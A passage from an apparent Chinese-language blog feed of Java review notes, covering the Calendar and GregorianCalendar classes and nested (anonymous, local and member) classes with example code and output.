align="center">星期几</td></tr></tbody></table><h4 id="2-8-4-Calendar类对象信息的设置"><a href="#2-8-4-Calendar类对象信息的设置" class="headerlink" title="2.8.4 Calendar类对象信息的设置"></a>2.8.4 Calendar类对象信息的设置</h4><h5 id="2-8-4-1-Set设置"><a href="#2-8-4-1-Set设置" class="headerlink" title="2.8.4.1 Set设置"></a>2.8.4.1 Set设置</h5><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Calendar c1 = Calendar.getInstance();<br></code></pre></div></td></tr></table></figure><p>调用：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title">set</span><span class="hljs-params">(<span class="hljs-keyword">int</span> year,<span class="hljs-keyword">int</span> month,<span class="hljs-keyword">int</span> date)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function">c1.<span class="hljs-title">set</span><span class="hljs-params">(<span class="hljs-number">2009</span>, <span class="hljs-number">6</span> - <span class="hljs-number">1</span>, <span class="hljs-number">12</span>)</span></span>;<span class="hljs-comment">//把Calendar对象c1的年月日分别设这为：2009、5、12</span><br></code></pre></div></td></tr></table></figure><h5 id="2-8-4-2-利用字段类型设置"><a href="#2-8-4-2-利用字段类型设置" class="headerlink" title="2.8.4.2 利用字段类型设置"></a>2.8.4.2 利用字段类型设置</h5><p>如果只设定某个字段，例如日期的值，则可以使用如下set方法：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">set</span><span class="hljs-params">(<span class="hljs-keyword">int</span> field,<span class="hljs-keyword">int</span> value)</span></span><br></code></pre></div></td></tr></table></figure><p>把 c1对象代表的日期设置为10号，其它所有的数值会被重新计算。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">c1.set(Calendar.DATE,<span class="hljs-number">10</span>);<br></code></pre></div></td></tr></table></figure><p>把c1对象代表的年份设置为2008年，其他的所有数值会被重新计算。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">c1.set(Calendar.YEAR,<span class="hljs-number">2008</span>);<br></code></pre></div></td></tr></table></figure><p>其他字段属性set的意义以此类推。</p><h4 id="2-8-5-Add设置"><a href="#2-8-5-Add设置" class="headerlink" title="2.8.5 Add设置"></a>2.8.5 Add设置</h4><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Calendar c1 = Calendar.getInstance();<br></code></pre></div></td></tr></table></figure><p>把c1对象的日期加上10，也就是c1所表的日期的10天后的日期，其它所有的数值会被重新计算。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">c1.add(Calendar.DATE, <span class="hljs-number">10</span>);<br></code></pre></div></td></tr></table></figure><p>把c1对象的日期减去10，也就是c1所表的日期的10天前的日期，其它所有的数值会被重新计算。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">c1.add(Calendar.DATE, -<span class="hljs-number">10</span>);<br></code></pre></div></td></tr></table></figure><p>其他字段属性的add的意义以此类推。</p><h4 id="2-8-6-Calendar类对象信息的获得"><a href="#2-8-6-Calendar类对象信息的获得" class="headerlink" title="2.8.6 Calendar类对象信息的获得"></a>2.8.6 Calendar类对象信息的获得</h4><p>实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Calendar c1 = Calendar.getInstance();<br><span class="hljs-comment">// 获得年份</span><br><span class="hljs-keyword">int</span> year = c1.get(Calendar.YEAR);<br><span class="hljs-comment">// 获得月份</span><br><span class="hljs-keyword">int</span> month = c1.get(Calendar.MONTH) + <span class="hljs-number">1</span>;<br><span class="hljs-comment">// 获得日期</span><br><span class="hljs-keyword">int</span> date = c1.get(Calendar.DATE);<br><span class="hljs-comment">// 获得小时</span><br><span class="hljs-keyword">int</span> hour = c1.get(Calendar.HOUR_OF_DAY);<br><span class="hljs-comment">// 获得分钟</span><br><span class="hljs-keyword">int</span> minute = c1.get(Calendar.MINUTE);<br><span class="hljs-comment">// 获得秒</span><br><span class="hljs-keyword">int</span> second = c1.get(Calendar.SECOND);<br><span class="hljs-comment">// 获得星期几（注意（这个与Date类是不同的）：1代表星期日、2代表星期1、3代表星期二，以此类推）</span><br><span class="hljs-keyword">int</span> day = c1.get(Calendar.DAY_OF_WEEK);<br></code></pre></div></td></tr></table></figure><h3 id="2-9-GregorianCalendar类"><a href="#2-9-GregorianCalendar类" class="headerlink" title="2.9 GregorianCalendar类"></a>2.9 GregorianCalendar类</h3><p>Calendar类实现了公历日历，GregorianCalendar是Calendar类的一个具体实现。Calendar 的getInstance（）方法返回一个默认用当前的语言环境和时区初始化的GregorianCalendar对象。GregorianCalendar定义了两个字段：AD和BC。这些代表公历定义的两个时代。</p><h4 id="2-9-1-GregorianCalendar对象的构造方法"><a href="#2-9-1-GregorianCalendar对象的构造方法" class="headerlink" title="2.9.1 GregorianCalendar对象的构造方法"></a>2.9.1 GregorianCalendar对象的构造方法</h4><table><thead><tr><th align="center">构造函数</th><th align="center"><strong>说明</strong></th></tr></thead><tbody><tr><td align="center"><strong>GregorianCalendar()</strong></td><td align="center">在具有默认语言环境的默认时区内使用当前时间构造一个默认的 GregorianCalendar。</td></tr><tr><td align="center"><strong>GregorianCalendar(int year, int month, int date)</strong></td><td align="center">在具有默认语言环境的默认时区内构造一个带有给定日期设置的 GregorianCalendar</td></tr><tr><td align="center"><strong>GregorianCalendar(int year, int month, int date, int hour, int minute)</strong></td><td align="center">为具有默认语言环境的默认时区构造一个具有给定日期和时间设置的 GregorianCalendar。</td></tr><tr><td align="center"><strong>GregorianCalendar(int year, int month, int date, int hour, int minute, int second)</strong></td><td align="center">为具有默认语言环境的默认时区构造一个具有给定日期和时间设置的 GregorianCalendar。</td></tr><tr><td align="center"><strong>GregorianCalendar(Locale aLocale)</strong></td><td align="center">在具有给定语言环境的默认时区内构造一个基于当前时间的 GregorianCalendar。</td></tr><tr><td align="center"><strong>GregorianCalendar(TimeZone zone)</strong></td><td align="center">在具有默认语言环境的给定时区内构造一个基于当前时间的 GregorianCalendar。</td></tr><tr><td align="center"><strong>GregorianCalendar(TimeZone zone, Locale aLocale)</strong></td><td align="center">在具有给定语言环境的给定时区内构造一个基于当前时间的 GregorianCalendar。</td></tr></tbody></table><h4 id="2-9-2-GregorianCalendar-类的方法"><a href="#2-9-2-GregorianCalendar-类的方法" class="headerlink" title="2.9.2 GregorianCalendar 类的方法"></a>2.9.2 GregorianCalendar 类的方法</h4><table><thead><tr><th align="center">方法</th><th align="center"><strong>说明</strong></th></tr></thead><tbody><tr><td align="center"><strong>void add(int field, int amount)</strong></td><td align="center">根据日历规则，将指定的（有符号的）时间量添加到给定的日历字段中。</td></tr><tr><td align="center"><strong>protected void computeFields()</strong></td><td align="center">转换UTC毫秒值为时间域值</td></tr><tr><td align="center"><strong>protected void computeTime()</strong></td><td align="center">覆盖Calendar ，转换时间域值为UTC毫秒值</td></tr><tr><td align="center"><strong>boolean equals(Object obj)</strong></td><td align="center">比较此 GregorianCalendar 与指定的 Object。</td></tr><tr><td align="center"><strong>int get(int field)</strong></td><td align="center">获取指定字段的时间值</td></tr><tr><td align="center"><strong>int getActualMaximum(int field)</strong></td><td align="center">返回当前日期，给定字段的最大值</td></tr><tr><td align="center"><strong>int getActualMinimum(int field)</strong></td><td align="center">返回当前日期，给定字段的最小值</td></tr><tr><td align="center"><strong>int getGreatestMinimum(int field)</strong></td><td align="center">返回此 GregorianCalendar 实例给定日历字段的最高的最小值。</td></tr><tr><td align="center"><strong>Date getGregorianChange()</strong></td><td align="center">获得格里高利历的更改日期。</td></tr><tr><td align="center"><strong>int getLeastMaximum(int field)</strong></td><td align="center">返回此 GregorianCalendar 实例给定日历字段的最低的最大值</td></tr><tr><td align="center"><strong>int getMaximum(int field)</strong></td><td align="center">返回此 GregorianCalendar 实例的给定日历字段的最大值。</td></tr><tr><td align="center"><strong>Date getTime()</strong></td><td align="center">获取日历当前时间。</td></tr><tr><td align="center"><strong>long getTimeInMillis()</strong></td><td align="center">获取用长整型表示的日历的当前时间</td></tr><tr><td align="center"><strong>TimeZone getTimeZone()</strong></td><td align="center">获取时区。</td></tr><tr><td align="center"><strong>int getMinimum(int field)</strong></td><td align="center">返回给定字段的最小值。</td></tr><tr><td align="center"><strong>int hashCode()</strong></td><td align="center">重写hashCode.</td></tr><tr><td align="center"><strong>boolean isLeapYear(int year)</strong></td><td align="center">确定给定的年份是否为闰年。</td></tr><tr><td align="center"><strong>void roll(int field, boolean up)</strong></td><td align="center">在给定的时间字段上添加或减去（上/下）单个时间单元，不更改更大的字段。</td></tr><tr><td align="center"><strong>void set(int field, int value)</strong></td><td align="center">用给定的值设置时间字段。</td></tr><tr><td align="center"><strong>void set(int year, int month, int date)</strong></td><td align="center">设置年、月、日的值。</td></tr><tr><td align="center"><strong>void set(int year, int month, int date, int hour, int minute)</strong></td><td align="center">设置年、月、日、小时、分钟的值。</td></tr><tr><td align="center"><strong>void set(int year, int month, int date, int hour, int minute, int second)</strong></td><td align="center">设置年、月、日、小时、分钟、秒的值。</td></tr><tr><td align="center"><strong>void setGregorianChange(Date date)</strong></td><td align="center">设置 GregorianCalendar 的更改日期。</td></tr><tr><td align="center"><strong>void setTime(Date date)</strong></td><td align="center">用给定的日期设置Calendar的当前时间。</td></tr><tr><td align="center"><strong>void setTimeInMillis(long millis)</strong></td><td align="center">用给定的long型毫秒数设置Calendar的当前时间。</td></tr><tr><td align="center"><strong>void setTimeZone(TimeZone value)</strong></td><td align="center">用给定时区值设置当前时区。</td></tr><tr><td align="center"><strong>String toString()</strong></td><td align="center">返回代表日历的字符串。</td></tr></tbody></table><p>实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.*;<br>  <br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GregorianCalendarDemo</span> </span>&#123;<br><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String args[])</span> </span>&#123;<br>      String months[] = &#123;<br>      <span class="hljs-string">&quot;Jan&quot;</span>, <span class="hljs-string">&quot;Feb&quot;</span>, <span class="hljs-string">&quot;Mar&quot;</span>, <span class="hljs-string">&quot;Apr&quot;</span>,<br>      <span class="hljs-string">&quot;May&quot;</span>, <span class="hljs-string">&quot;Jun&quot;</span>, <span class="hljs-string">&quot;Jul&quot;</span>, <span class="hljs-string">&quot;Aug&quot;</span>,<br>      <span class="hljs-string">&quot;Sep&quot;</span>, <span class="hljs-string">&quot;Oct&quot;</span>, <span class="hljs-string">&quot;Nov&quot;</span>, <span class="hljs-string">&quot;Dec&quot;</span>&#125;;<br>      <br>      <span class="hljs-keyword">int</span> year;<br>      <span class="hljs-comment">// 初始化 Gregorian 日历</span><br>      <span class="hljs-comment">// 使用当前时间和日期</span><br>      <span class="hljs-comment">// 默认为本地时间和时区</span><br>      GregorianCalendar gcalendar = <span class="hljs-keyword">new</span> GregorianCalendar();<br>      <span class="hljs-comment">// 显示当前时间和日期的信息</span><br>      System.out.print(<span class="hljs-string">&quot;Date: &quot;</span>);<br>      System.out.print(months[gcalendar.get(Calendar.MONTH)]);<br>      System.out.print(<span class="hljs-string">&quot; &quot;</span> + gcalendar.get(Calendar.DATE) + <span class="hljs-string">&quot; &quot;</span>);<br>      System.out.println(year = gcalendar.get(Calendar.YEAR));<br>      System.out.print(<span class="hljs-string">&quot;Time: &quot;</span>);<br>      System.out.print(gcalendar.get(Calendar.HOUR) + <span class="hljs-string">&quot;:&quot;</span>);<br>      System.out.print(gcalendar.get(Calendar.MINUTE) + <span class="hljs-string">&quot;:&quot;</span>);<br>      System.out.println(gcalendar.get(Calendar.SECOND));<br>      <br>      <span class="hljs-comment">// 测试当前年份是否为闰年</span><br>      <span class="hljs-keyword">if</span>(gcalendar.isLeapYear(year)) &#123;<br>         System.out.println(<span class="hljs-string">&quot;当前年份是闰年&quot;</span>);<br>      &#125;<br>      <span class="hljs-keyword">else</span> &#123;<br>         System.out.println(<span class="hljs-string">&quot;当前年份不是闰年&quot;</span>);<br>      &#125;<br>   &#125;<br>&#125;<br><span class="hljs-comment">/*输出结果*/</span><br>Date: Apr <span class="hljs-number">22</span> <span class="hljs-number">2009</span><br>Time: <span class="hljs-number">11</span>:<span class="hljs-number">25</span>:<span class="hljs-number">27</span><br>当前年份不是闰年<br></code></pre></div></td></tr></table></figure><hr>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JAVA基础知识复习（十）</title>
    <link href="/2021/05/19/JAVA/JAVA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E5%8D%81%EF%BC%89/"/>
    <url>/2021/05/19/JAVA/JAVA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E5%8D%81%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>JAVA基础知识复习（十）。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-Java类"><a href="#1-Java类" class="headerlink" title="1.Java类"></a>1.Java类</h2><h3 id="1-1-Java-嵌套类"><a href="#1-1-Java-嵌套类" class="headerlink" title="1.1 Java 嵌套类"></a>1.1 Java 嵌套类</h3><p>在任何类外部声明的类是顶级类。嵌套类是声明为其他类或作用域的成员的类。有四种嵌套类：静态成员类、非静态成员类、匿名类、局部类。</p><h4 id="1-1-1-匿名类"><a href="#1-1-1-匿名类" class="headerlink" title="1.1.1 匿名类"></a>1.1.1 匿名类</h4><p>匿名类是没有名称并同时声明的类。可以实例化一个匿名类，在其中指定一个表达式是合法的。一个匿名类实例只能访问局部最终变量和最终参数。</p><p>实例：定义匿名类。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">People</span> </span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title">speak</span><span class="hljs-params">()</span></span>;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String[] args)</span> </span>&#123;<br>    <span class="hljs-keyword">new</span> People() &#123;<br>      String msg = <span class="hljs-string">&quot;test&quot;</span>;<br><br>      <span class="hljs-meta">@Override</span><br>      <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">speak</span><span class="hljs-params">()</span> </span>&#123;<br>        System.out.println(msg);<br>      &#125;<br>    &#125;.speak();<br>  &#125;<br>&#125;<br><span class="hljs-comment">/*输出结果*/</span><br>test<br></code></pre></div></td></tr></table></figure><p>实例：声明和实例化一个实现接口的匿名类。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">People</span> </span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title">speak</span><span class="hljs-params">()</span></span>;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String[] args)</span> </span>&#123;<br>    <span class="hljs-keyword">new</span> People() &#123;<br>      String msg = (args.length == <span class="hljs-number">1</span>) ? args[<span class="hljs-number">0</span>] : <span class="hljs-string">&quot;nothing to say&quot;</span>;<br><br>      <span class="hljs-meta">@Override</span><br>      <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">speak</span><span class="hljs-params">()</span> </span>&#123;<br>        System.out.println(msg);<br>      &#125;<br>    &#125;.speak();<br>  &#125;<br>&#125;<br><span class="hljs-comment">/*输出结果*/</span><br>nothing to say<br></code></pre></div></td></tr></table></figure><h4 id="1-1-2-局部类"><a href="#1-1-2-局部类" class="headerlink" title="1.1.2 局部类"></a>1.1.2 局部类</h4><p>本地类是在声明局部变量的任何地方声明的类。局部类与局部变量具有相同的范围。一个本地类有一个名称，可以重复使用。本地类实例可以访问周围范围的本地最终变量和最终参数。</p><p>实例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyClass</span> </span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">myMethod</span><span class="hljs-params">(<span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> y = x;<br>    <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LocalClass</span> </span>&#123;<br>      <span class="hljs-keyword">int</span> a = x;<br>      <span class="hljs-keyword">int</span> b = y;<br>    &#125;<br>    <br>    LocalClass lc = <span class="hljs-keyword">new</span> LocalClass();<br>    System.out.println(lc.a);<br>    System.out.println(lc.b);<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>    MyClass ec = <span class="hljs-keyword">new</span> MyClass();<br>    ec.myMethod(<span class="hljs-number">10</span>);<br>  &#125;<br>&#125;<br><span class="hljs-comment">/*输出结果*/</span><br><span class="hljs-number">10</span><br><span class="hljs-number">10</span><br></code></pre></div></td></tr></table></figure><p>实例：声明一个Iterator接口和Iter内部类。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Item</span></span>&#123;<br>  <span class="hljs-keyword">private</span> String name;<br>  <span class="hljs-keyword">private</span> String value;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Item</span><span class="hljs-params">(String n, String v)</span></span>&#123;<br>    name = n;<br>    value = v;<br>  &#125;<br>  <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">return</span> name + value;<br>  &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Iterator</span> </span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">hasMoreElements</span><span class="hljs-params">()</span></span>;<br><br>  <span class="hljs-function">Object <span class="hljs-title">nextElement</span><span class="hljs-params">()</span></span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ItemManager</span> </span>&#123;<br>  <span class="hljs-keyword">private</span> Item[] itemArray;<br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> index = <span class="hljs-number">0</span>;<br><br>  ItemManager(<span class="hljs-keyword">int</span> size) &#123;<br>    itemArray = <span class="hljs-keyword">new</span> Item[size];<br>  &#125;<br><br>  <span class="hljs-function">Iterator <span class="hljs-title">iterator</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Iter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Iterator</span> </span>&#123;<br>      <span class="hljs-keyword">int</span> index = <span class="hljs-number">0</span>;<br><br>      <span class="hljs-meta">@Override</span><br>      <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">hasMoreElements</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> index &lt; itemArray.length;<br>      &#125;<br><br>      <span class="hljs-meta">@Override</span><br>      <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">nextElement</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> itemArray[index++];<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Iter();<br>  &#125;<br><br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">add</span><span class="hljs-params">(Item item)</span> </span>&#123;<br>    itemArray[index++] = item;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>    ItemManager itemManager = <span class="hljs-keyword">new</span> ItemManager(<span class="hljs-number">5</span>);<br>    itemManager.add(<span class="hljs-keyword">new</span> Item(<span class="hljs-string">&quot;#1&quot;</span>, <span class="hljs-string">&quot;A&quot;</span>));<br>    itemManager.add(<span class="hljs-keyword">new</span> Item(<span class="hljs-string">&quot;#2&quot;</span>, <span class="hljs-string">&quot;B&quot;</span>));<br>    itemManager.add(<span class="hljs-keyword">new</span> Item(<span class="hljs-string">&quot;#3&quot;</span>, <span class="hljs-string">&quot;C&quot;</span>));<br>    Iterator iter = itemManager.iterator();<br>    <span class="hljs-keyword">while</span> (iter.hasMoreElements())&#123;<br>      System.out.println(iter.nextElement());<br>    &#125;<br>      <br>  &#125;<br>&#125;<br><span class="hljs-comment">/*输出结果*/</span><br>#1A<br>#2B<br>#3C<br><span class="hljs-keyword">null</span><br><span class="hljs-keyword">null</span><br></code></pre></div></td></tr></table></figure><h4 id="1-1-3-成员类"><a href="#1-1-3-成员类" class="headerlink" title="1.1.3 成员类"></a>1.1.3 成员类</h4><p>成员类是封闭类的成员。成员类的每个实例都与封闭类的实例相关联。成员类的实例方法可以调用实例方法封闭类和访问封闭类实例的非静态字段。</p><p>实例：名为 EnclosingClass 的外部类和名为 EnclosedClass 的非静态成员类</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EnclosingClass</span> </span>&#123;<br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> outerVariable;<br><br>  <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">privateOuterMethod</span><span class="hljs-params">()</span> </span>&#123;<br>    System.out.println(outerVariable);<br>  &#125;<br><br>  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EnclosedClass</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">accessEnclosingClass</span><span class="hljs-params">()</span> </span>&#123;<br>      outerVariable = <span class="hljs-number">1</span>;<br>      privateOuterMethod();<br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span 